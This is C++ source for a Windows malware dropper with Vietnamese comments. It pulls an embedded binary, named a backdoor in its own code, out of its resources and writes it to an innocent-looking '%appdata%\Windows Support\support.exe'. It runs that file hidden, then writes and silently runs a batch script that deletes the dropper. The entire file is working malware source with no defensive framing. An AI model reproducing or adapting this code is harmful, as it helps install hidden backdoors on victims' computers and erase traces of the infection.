#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

#include "resource.h"

#define BUFSIZE 1000

std::wstring m_file;
std::wstring m_bat;
std::wstring m_path;

void init()
{
    WCHAR buf[BUFSIZE];
    memset(buf, 0, sizeof(buf));
    GetEnvironmentVariable(L"appdata", buf, sizeof(buf));
    m_path = std::wstring(buf) + L"\\Windows Support\\";
    m_file = m_path + L"support.exe";
    m_bat = m_path + L"support.bat";

    // tạo thư mục %appdata%\Windows Support
    CreateDirectory(m_path.c_str(), NULL);
}


void DumpBackdoor()
{
    // Load Resource
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(IDR_BINARY1), L"BINARY");
	HGLOBAL hBinary = LoadResource(hModule, hRes);
	DWORD dwSize = SizeofResource(hModule, hRes);
    void* data = LockResource(hBinary);
   
    // Write binary
    std::ofstream fo(m_file, std::ios::out | std::ios::binary);
    fo.write((char*)data, dwSize);
    fo.close();
    FreeResource(hBinary);
}

void selfDestruct()
{
    // Tạo bat script để nó xoá file thực thi khi chạy xong
    WCHAR buf[] = L":Repeat\r\ndel \"%s\"\r\nif exist \"%s\" goto Repeat\r\ndel \"%s\"";
    WCHAR bat[BUFSIZE * 2];
    WCHAR filename[BUFSIZE];
    FILE* fp;

    HMODULE hModule = GetModuleHandle(NULL);
    memset(filename, 0, sizeof(filename));
    GetModuleFileName(hModule, filename, sizeof(filename));

    memset(bat, 0, sizeof(bat));
    wsprintf(bat, buf, filename, filename, m_bat.c_str());

    _wfopen_s(&fp, m_bat.c_str(), L"w, ccs=UTF-8");
    fwprintf(fp, bat);
    fclose(fp);

    ShellExecute(NULL, L"open", m_bat.c_str(), NULL, NULL, SW_HIDE);

}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    init();
    DumpBackdoor();
    ShellExecute(NULL, L"open", m_file.c_str(), NULL, NULL, SW_HIDE);
    selfDestruct();
}


